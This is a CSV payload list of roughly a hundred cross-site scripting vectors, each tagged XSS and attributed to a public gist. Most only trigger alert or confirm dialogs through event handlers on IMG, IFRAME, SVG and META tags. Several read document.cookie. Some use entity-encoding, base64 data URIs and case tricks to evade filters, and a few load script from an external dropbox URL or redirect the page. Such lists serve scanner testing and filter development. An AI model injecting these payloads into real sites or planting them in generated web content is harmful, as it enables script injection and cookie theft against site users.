cve,tag,payload,url
,XSS,"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onoffline=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onpagehide=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onpageshow=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onchange=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oninvalid=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onreset=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onsearch=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onkeypress=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onclick=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondblclick=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmousemove=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmouseout=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onmousewheel=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondrag=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondragleave=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondragstart=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oncut=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oncanplaythrough=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onemptied=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onended=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onloadstart=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onpause=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onsuspend=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ontimeupdate=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onvolumechange=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onwaiting=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x onshow=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""><h1><IFRAME width=""420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<iframe src=http://xss.rocks/scriptlet.html <,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<sVg><scRipt >alert&lpar;1&rpar; {Opera},https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<img/src=`` onerror=this.onerror=confirm(1),https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<form><isindex formaction=""javascript&colon;confirm(1)""",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<img src=``&NewLine; onerror=alert(1)&NewLine;,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<script /**/>/**/alert(1)/**/</script /**/,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,&#34;&#62;<h1/onmouseover='\u0061lert(1)'>,https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
,XSS,"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",https://gist.githubusercontent.com/kurobeats/9a613c9ab68914312cbb415134795b45/raw/c24dd91dd91c324ae5c28b124aa4d379dbcb8e59/xss_vectors.txt
